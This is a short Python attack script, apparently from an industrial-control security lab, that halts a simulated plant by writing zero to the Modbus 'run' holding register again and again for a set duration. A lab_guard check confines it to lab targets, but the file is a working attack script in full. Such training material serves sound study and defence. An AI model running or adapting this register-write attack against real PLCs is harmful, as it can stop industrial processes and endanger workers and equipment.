#!/usr/bin/env python3
"""Attack: stop production by disabling run command.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 1.0.0
"""

from __future__ import annotations

import argparse
import logging
import time
from typing import Final

from pymodbus.client import ModbusTcpClient

from lab_guard import LabTargetError, assert_lab_target


LOGGER: Final[logging.Logger] = logging.getLogger("attacks.attack_stop_fill")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(description="Stop plant by forcing RUN=0")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=15020)
    parser.add_argument("--duration", type=float, default=15.0)
    return parser.parse_args()


def main() -> int:
    """Entrypoint."""
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
    args = parse_args()
    try:
        assert_lab_target(args.host)
    except LabTargetError as exc:
        LOGGER.error("%s", exc)
        return 2
    client = ModbusTcpClient(host=args.host, port=args.port)
    if not client.connect():
        LOGGER.error("Unable to connect to %s:%s", args.host, args.port)
        return 1

    started_at = time.time()
    try:
        while time.time() - started_at < max(1.0, float(args.duration)):
            response = client.write_register(address=0, value=0, device_id=1)  # HR1 -> run off
            if response.isError():
                LOGGER.error("Write failed HR[0001]")
            time.sleep(0.25)
        LOGGER.info("Attack finished")
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
